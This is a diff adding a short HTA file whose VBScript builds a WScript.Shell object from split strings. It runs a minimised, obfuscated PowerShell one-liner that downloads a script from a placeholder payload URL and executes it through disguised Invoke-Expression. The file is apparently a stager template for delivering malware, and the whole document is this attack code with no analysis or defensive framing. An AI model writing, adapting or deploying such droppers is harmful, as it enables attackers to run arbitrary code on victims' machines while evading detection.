@@ -1,0 +1,16 @@
+<HTML> 
+<HEAD> 
+<script language="VBScript">
+	Set WshShell = CreateObject("W"+"S"+"cr"+"ip"+"t."+"Sh"+"e"+"l"+"l")
+	Connect="poWErsHeLL.exe -NOPR -cOM (New-Object Net.WebClient).DownloadString('https://Link to your payload ')|.( ([String]''.Chars)[15,18,19]-Join'')"
+
+	WshShell.Run Connect, 4, true
+
+</script>
+<HTA:APPLICATION ID="test"
+WINDOWSTATE = "minimize">
+
+</HEAD> 
+<BODY> 
+</BODY> 
+</HTML> 
